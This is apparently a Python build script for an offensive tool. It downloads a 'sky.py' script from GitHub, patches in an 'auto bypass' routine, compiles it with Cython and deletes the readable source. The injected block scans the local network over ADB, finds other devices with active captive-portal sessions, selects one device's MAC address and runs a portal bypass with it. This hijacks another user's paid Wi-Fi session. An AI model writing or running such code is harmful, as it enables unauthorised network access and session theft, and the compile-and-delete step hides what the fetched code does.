import os
import subprocess
import urllib.request
import re

# URL to the raw original sky.py (stable version)
RAW_URL = "https://raw.githubusercontent.com/paingzin3521-ux/scan1/22939a9/sky.py"

print("[*] Downloading original source code...")
try:
    with urllib.request.urlopen(RAW_URL) as response:
        source_code = response.read().decode('utf-8')
    
    # Fix the Signal 9 (OOM) crash by reducing max_workers
    optimized_code = re.sub(r'max_workers\s*=\s*\d+', 'max_workers=30', source_code)
    
    # Improved Option 7 Auto Bypass logic
    # It will now check if gateway IP has changed and re-scan if needed
    bypass_fix = """
        elif ch == "7":
            cur_gw = get_gateway_ip()
            if not PORTAL_URL or (GATEWAY_IP and cur_gw and GATEWAY_IP != cur_gw):
                print(f"{YELLOW}[!] Network changed or Portal URL missing. Re-scanning...{RESET}")
                if adb_connect_step():
                    detected = auto_detect_portal_url()
                    if detected:
                        PORTAL_URL = detected
                        save_portal_url(detected)
                    devices = scan_network_via_adb()
                    if devices:
                        ACTIVE_DEVICES = []
                        for i, dev in enumerate(devices, 1):
                            print_progress_bar(i, len(devices), f"| Testing: {dev['ip']}")
                            sid = check_mac_active(PORTAL_URL, dev['mac'])
                            if sid:
                                dev['session_id'] = sid
                                ACTIVE_DEVICES.append(dev)
                        if ACTIVE_DEVICES:
                            SELECTED_MAC = ACTIVE_DEVICES[0]['mac']
                            save_mac(SELECTED_MAC)
            
            if not SELECTED_MAC or not PORTAL_URL:
                print(f"{RED}[-] No target MAC or Portal URL found. Please run Option 2 first.{RESET}")
            else:
                ok, sid = run_bypass_for_mac(PORTAL_URL, SELECTED_MAC)
                if ok:
                    print(f"\\n{GREEN}[ ✓ ] Bypass successful for {SELECTED_MAC}{RESET}")
                else:
                    print(f"\\n{RED}[-] Bypass failed. Re-scanning...{RESET}")
                    # Re-scan logic if bypass fails
                    if adb_connect_step():
                        devices = scan_network_via_adb()
                        if devices:
                            ACTIVE_DEVICES = []
                            for i, dev in enumerate(devices, 1):
                                sid = check_mac_active(PORTAL_URL, dev['mac'])
                                if sid:
                                    dev['session_id'] = sid
                                    ACTIVE_DEVICES.append(dev)
                            if ACTIVE_DEVICES:
                                SELECTED_MAC = ACTIVE_DEVICES[0]['mac']
                                save_mac(SELECTED_MAC)
                                run_bypass_for_mac(PORTAL_URL, SELECTED_MAC)
            input("\\nPress Enter to return...")
    """
    
    # Replace the old Option 7 block with the improved one
    # We use a regex to find the elif ch == "7" block and replace it
    pattern = r'elif ch == "7":.*?input\("\\nPress Enter to return\.\.\."\)'
    optimized_code = re.sub(pattern, bypass_fix, optimized_code, flags=re.DOTALL)
    
    with open("sky.py", "w") as f:
        f.write(optimized_code)
except Exception as e:
    print(f"[-] Error downloading source: {e}")
    exit(1)

# Create setup.py for Cython
with open("setup.py", "w") as f:
    f.write("""from setuptools import setup
from Cython.Build import cythonize
setup(ext_modules = cythonize("sky.py"))
""")

# Compile to .so
print("[*] Compiling for your device architecture...")
subprocess.run(["python", "setup.py", "build_ext", "--inplace"])

# Cleanup
print("[*] Cleaning up source files...")
if os.path.exists("sky.py"):
    os.rename("sky.py", "sky_source.py")

# Rename the resulting .so file
for file in os.listdir("."):
    if file.startswith("sky.cpython") and file.endswith(".so"):
        os.rename(file, "sky.so")
        break

# Create loader script that calls main()
with open("sky.py", "w") as f:
    f.write("import sky\ntry:\n    sky.main()\nexcept AttributeError:\n    pass\n")

# Final cleanup
if os.path.exists("sky_source.py"):
    os.remove("sky_source.py")
if os.path.exists("sky.c"):
    os.remove("sky.c")
if os.path.exists("setup.py"):
    os.remove("setup.py")

print("[✓] Build complete! Now type 'python sky.py' to start.")
